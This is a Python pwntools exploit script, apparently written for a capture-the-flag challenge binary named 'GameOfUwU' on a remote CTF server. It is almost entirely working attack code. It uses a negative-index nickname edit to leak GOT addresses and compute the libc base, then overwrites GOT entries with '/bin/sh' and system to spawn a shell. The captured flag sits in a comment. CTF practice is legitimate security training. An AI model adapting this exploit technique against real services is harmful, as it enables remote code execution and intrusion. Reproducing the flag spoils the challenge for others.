#!/usr/bin/env python3
from enum import Enum
from pwn import *


# ----------------------=[Python Stuff]=---------------------- #

class Mode(Enum):
    DEBUG = 0
    LOCAL = 1
    REMOTE = 2


# ----------------------=[Packing Utils]=---------------------- #

p64 = lambda n: packing.pack(n, 64)
u64 = lambda n: packing.unpack(n, 64)
u32 = lambda n: packing.unpack(n, 32)
uu64 = lambda data: u64(data.ljust(8, b'\x00'))
uu32 = lambda data: u32(data.ljust(4, b'\x00'))

# ---------------------=[Common Settings]=--------------------- #

# bin_path = './GameOfUwU_noclear.patch'
bin_path = './GameOfUwU'
# local_libc_path = './libc.so.6'
local_libc_path = './libc6_2.35-0ubuntu3.4_amd64.so'
remote_url = 'chal.firebird.sh'
remote_port = 35025

context.log_level = 'debug'
context.binary = bin_path

gdb_break_points = [
    ''
]


# ------------------------=[Exploit]=-------------------------- #

def initialize_io(mode: Mode) -> process | remote:
    gdbscripts = "handle SIGALRM ignore\n"
    for bp in gdb_break_points:
        if bp:  # is not empty str
            gdbscripts += f"b* {bp}\n"

    # Initialize io based on mode
    match mode:
        case Mode.DEBUG:
            context.terminal = ["tmux", "splitw", "-hp", "62"]
            return gdb.debug([bin_path], gdbscripts)
        case Mode.LOCAL:
            return process([bin_path])
        case Mode.REMOTE:
            return remote(remote_url, remote_port)
        case _:
            exit(-1)


# -----------------------=[Main Pwn]=-------------------------- #

def do_pwn(io: process | remote) -> None:
    sla = io.sendlineafter
    sa = io.sendafter
    sl = io.sendline
    sd = io.send
    rl = io.recvline
    ru = io.recvuntil

    rop = ROP(bin_path)
    elf = ELF(bin_path)
    libc = ELF(local_libc_path)

    def exploit() -> None:
        funcs_in_got = ["strcpy", "puts", "system", "printf", "strcspn", "srand", "fgets", "strcmp", "getchar",
                        "time", "setvbuf", "__isoc99_scanf", "sprintf", "exit", "sleep", "rand"]

        # Get where TEAM array is located
        team_addr = elf.sym['TEAM']

        def main_menu(choice: bytes) -> None:
            ru(b'1: Play    2: View Team    3: Edit Nickname    0: Exit\n  ')
            sl(choice)

        def open_shell():
            # We only really want to try with srand because then we can overwrite strcspn with system
            funcs_in_got = ["srand"]
            for leak_func in funcs_in_got:
                print(f"Trying to leak {leak_func}")
                # Func to use to leak
                leak_func_addr = elf.got[leak_func]

                # leak addr of func in libc
                index = -((team_addr - leak_func_addr) // 16)
                after_eight_bytes = (team_addr - leak_func_addr) % 16 == 8
                print(f"Index: {index}")
                print(f"After eight bytes: {after_eight_bytes}")
                if after_eight_bytes:
                    print(f"We cannot use this one for anything, sadly")
                    continue

                print(f"Address of index: {hex(team_addr + index * 16)} ({team_addr + index * 16})")
                print(f"Address of {leak_func}@got: {hex(leak_func_addr)} ({leak_func_addr})")
                print(f"Address of strcspn@got: {hex(elf.got['strcspn'])} ({elf.got['strcspn']})")

                # Edit nickname
                main_menu(bytes(str(3), encoding='utf-8'))

                sla(b'  Whose nickname do you want to edit? (Please enter an index)\n  ',
                    bytes(str(index + 1), encoding="utf-8"))
                ru(b'  Please get a new name to ')
                current_name = ru(b'!', drop=True)
                print(f'Current name: {current_name}')
                addr = uu64(current_name[:8])
                print(f'Addr: {hex(addr)=}')

                # Calculate libc base
                possible_lib_c_addr = addr - libc.sym[leak_func]
                print(f"Possible libc addr for {leak_func}: {hex(possible_lib_c_addr)}")
                if hex(possible_lib_c_addr)[-3:] != "000":
                    print(f"Could not find possible libc addr for {leak_func}")
                    sla(b'What is its new nickname? \n  ', current_name)
                    continue
                print(f"Found possible libc addr for {leak_func}: {hex(possible_lib_c_addr)}")
                libc.address = addr - libc.sym[leak_func]
                print(f"Libc base: {hex(libc.address)}")
                print(f"srand: {hex(libc.sym['srand'])}")
                print(f"strcmp: {hex(libc.sym['strcmp'])}")
                print(f"system: {hex(libc.sym['system'])}")

                payload = flat(
                    b'/bin/sh\x00',  # this should overwrite srand, which is TEAM[index-1]
                    p64(libc.sym['system'])  # strcmp should be here
                )
                sla(b'What is its new nickname? \n  ', payload)

                # open the shell cuz apparently it's too hard for the program to do it immediately smh
                sla(b'  Whose nickname do you want to edit? (Please enter an index)\n  ',
                    bytes(str(index + 1), encoding="utf-8"))
                sla(b'What is its new nickname? \n  ', b'/bin/sh')

                break

                # flag{g07cha_k1ng_0f_UwU_w45_c4ugh7!}

        def leak_libc():
            lib_addresses = {}
            for leak_func in funcs_in_got:
                print(f"Trying to leak {leak_func}")
                # Get addr of func in got table (from binary)
                leak_func_addr = elf.got[leak_func]

                # Check if a possible index is divisible by 16 (since we can only get output of the first 8 bytes)
                if (team_addr - leak_func_addr) % 16 == 8:
                    print(f"We cannot use this one for anything, sadly")
                    continue

                # Enter edit nickname function
                main_menu(bytes(str(3), encoding='utf-8'))
                # Calculate index
                index = -((team_addr - leak_func_addr) // 16)
                print(f"Index to get addr of {leak_func}: {index}")
                # Choose index
                sla(b'  Whose nickname do you want to edit? (Please enter an index)\n  ',
                    bytes(str(index + 1), encoding="utf-8"))
                ru(b'  Please get a new name to ')
                # Get current contents of address
                current_name = ru(b'!', drop=True)
                print(f'Current name: {current_name}')
                # Convert to address
                addr = uu64(current_name[:8])
                print(f'Addr: {hex(addr)=}')

                # Add to dict
                lib_addresses[leak_func] = hex(addr)
                # Keep old address to not break program
                sla(b'What is its new nickname? \n  ', current_name)
            print(f"Lib addresses: {lib_addresses}")
            pause()

        sla(b'Press any key to continue...', b'')

        # leak_libc()
        open_shell()

    exploit()
    # pause()


# --------------------=[End of Exploit]=----------------------- #

def main() -> None:
    io = initialize_io(Mode.REMOTE)
    do_pwn(io)
    io.interactive()


if __name__ == '__main__':
    main()

# ----------------------------=[EOF]=--------------------------- #
